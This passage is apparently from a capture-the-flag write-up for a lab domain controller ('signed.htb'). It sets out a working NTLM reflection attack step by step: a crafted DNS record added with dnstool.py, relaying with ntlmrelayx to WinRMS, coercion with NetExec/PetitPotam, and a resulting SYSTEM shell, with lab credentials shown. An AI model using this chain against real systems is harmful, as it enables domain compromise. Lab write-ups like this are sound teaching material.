
---

Apparently we can abuse an NTLM Reflection Attack. In order to exploit this, we need:

Add an DNS Entry pointing back to us. This DNS Entry has to be made according to a very specific format, which is explained in great detail. Simply it has to be a hostname that resolves to the machine itself, prepended with a marshaled string.

```
<MACHINE NAME>+1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

Templates:

```
# localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
# dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
# signed1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

1. To add the DNS entry, we can use the dnstools.py from krbrelayx 

**Note**: Execute from the directory in which is stored to have the python libraries.

```
python3 /opt/arsenal/krbrelayx/dnstool.py -u 'SIGNED.HTB\mssqlsvc' -p 'purPLE9795!@' -a add -r dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 10.10.15.9 10.129.242.173
```

2. Then you need to start ntlmrelayx.py to relay the coerced authentication. But what are we relaying it to? As of now, it is possible to relay to MSSQL , ESC8 , and WinRMS . Since we have WinRMS (5986), let's relay to that.

```
/usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t winrms://10.129.242.173 -smb2support
```

3. Then, finally, we can coerce the target using the DNS entry we added. For that, we can use NetExec 's coerce_plus module. (Subsequently, Petitpotam can also be used for this)

```
nxc smb dc01.signed.htb -u mssqlsvc -p 'purPLE9795!@' -M
coerce_plus -o L=dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA M=Petit
```

4. Now we can access the WinRMS shell from the socks proxy at 127.0.0.1:11000 .

```
nc 127.0.0.1 11000                            
Type help for list of commands

# whoami
nt authority\system

#
```